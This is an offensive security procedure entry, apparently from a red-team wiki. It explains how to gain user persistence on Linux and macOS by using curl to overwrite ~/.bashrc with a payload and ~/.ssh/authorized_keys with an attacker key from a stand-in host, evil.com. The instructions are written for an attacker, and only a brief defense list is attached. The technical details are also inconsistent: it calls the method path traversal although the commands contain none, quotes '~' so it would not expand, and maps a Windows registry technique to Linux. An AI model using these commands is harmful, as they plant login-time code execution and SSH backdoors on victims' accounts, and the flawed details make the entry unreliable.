---
tags:
  - persistence
  - ssh
  - bashrc
type: procedure
tools:
  - '[[tools/cURL]]'
tactics:
  - '[[Persistence]]'
commands:
  - '[[commands/curl-bashrc-overwrite]]'
  - '[[commands/curl-authorized-keys-overwrite]]'
verified: false
platforms:
  - Linux
  - macOS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Manipulation]]'
  - '[[Registry Run Keys - Startup Folder]]'
updated_at: '2025-12-14T17:26:12.444Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 336d0365-df0a-43aa-9ae6-7f4594026e90
validated: true
mitre_tactics:
  - '[[Persistence]]'
mitre_techniques:
  - '[[Account Manipulation]]'
  - '[[Registry Run Keys - Startup Folder]]'
---
# Achieve-User-Persistence-with-cURL-File-Writes

## Summary

This procedure uses cURL path traversal to overwrite user config files like ~/.bashrc for code execution on login and ~/.ssh/authorized_keys for unauthorized SSH access.

## Description

At user level, traversal targets home directory files. Target: Linux/macOS with vulnerable cURL. Outcomes: Persistence via shell init and backdoor SSH access.

## Requirements

1. User shell access
2. Attacker servers hosting malicious content and key.pub
3. Home directory writable

## Defense

Defensive measures and detection strategies:

- Monitor home directory file changes with inotify or auditd
- Use SSH key management tools; restrict authorized_keys appends
- Educate on safe curl usage; prefer wget with validation
- Enable bash history logging for suspicious commands

## Objectives

1. Inject code into shell startup
2. Add attacker SSH key for access
3. Establish long-term persistence

## Instructions

### Step 1: Overwrite Bashrc for Persistence

**Context**: Add malicious commands to execute on login.

**Command** ([[commands/curl-bashrc-overwrite]]):

```bash
curl http://evil.com/ -o "~/.bashrc"
```

> Overwrites ~/.bashrc with payload. Expected: Executes on next shell.

### Step 2: Add SSH Authorized Key

**Context**: Enable passwordless attacker login.

**Command** ([[commands/curl-authorized-keys-overwrite]]):

```bash
curl http://evil.com/key.pub -o "~/.ssh/authorized_keys"
```

> Writes key to authorized_keys. Expected: Attacker SSH access granted.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]] Persistence

### Techniques

- [[Account Manipulation]] Account Manipulation: Add Account
- [[Registry Run Keys - Startup Folder]] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

### Sub-Techniques


## Commands Used

- [[commands/curl-bashrc-overwrite]]
- [[commands/curl-authorized-keys-overwrite]]

## Tools Used

- [[tools/cURL]]

## Tags

- persistence
- ssh
- bashrc
